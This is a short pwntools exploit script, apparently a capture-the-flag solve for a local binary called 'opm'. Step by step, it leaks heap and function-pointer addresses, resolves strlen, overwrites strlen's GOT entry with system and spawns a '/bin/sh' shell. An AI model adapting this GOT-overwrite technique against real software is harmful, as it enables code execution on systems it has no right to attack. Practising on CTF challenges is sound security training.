from pwn import *

p = process("./opm")
elf = ELF("./opm")
libc = ELF("./opm")

context.log_level = 'debug'

def add(name, number):
    p.recvuntil("(E)xit\n")
    p.sendline("A")
    p.recvuntil("Your name:\n")
    p.sendline(name)
    p.recvuntil("N punch?\n")
    p.sendline(str(number))

def show():
    p.recvuntil("(E)xit\n")
    p.sendline("S")

def quit():
    p.recvuntil("(E)xit\n")
    p.sendline("E")

#part one: leak heap
add("A"*0x70, 9)
gdb.attach(p)
add("B"*0x80 + "\xf0", 9)
add("C"*0x80, "D"*0x80 + "\xf0")
heap = u64(p.recv(15)[9:].ljust(8, "\x00"))
log.info("heap: %s" % hex(heap))

#part two: leak function ptr
add("d" *0x18 + p64(heap + 0x90), '131425' + "F"*0x7a + p64(heap + 0xd0))
func_ptr = u64(p.recv(7)[1:].ljust(8, "\x00"))
log.info("function_ptr: %s" % hex(func_ptr))

#part three: leak strlen real address
base = func_ptr - 0xb30
strlen_got = base + elf.got['strlen']
gdb.attach(p)
add("d"*0x18 + p64(strlen_got), "131329" + "F"*0x7a + p64(heap + 0x130))
strlen = u64(p.recv(7)[1:].ljust(8, "\x00"))
log.info("real strlen: %s" % hex(strlen))

#part four: modify strlen got
system_addr = strlen - 0x46390
log.info("system: %s" % hex(system_addr))
gdb.attach(p)
add("Bill", str(system_addr & 0xffffffff).ljust(0x80, "G") + p64(strlen_got-0x18))
add("/bin/sh\x00", 8)
p.interactive()
